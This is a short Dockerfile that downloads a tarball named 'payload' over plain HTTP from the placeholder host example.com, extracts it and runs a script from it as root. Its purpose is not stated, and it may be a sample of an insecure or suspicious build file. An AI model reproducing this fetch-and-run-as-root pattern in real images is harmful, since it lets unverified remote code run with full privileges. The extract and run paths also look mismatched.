FROM ubuntu:latest

ADD http://example.com/payload.tar.gz /tmp/
RUN tar -xzf /tmp/payload.tar.gz

USER root

CMD ["/tmp/payload/run.sh"]
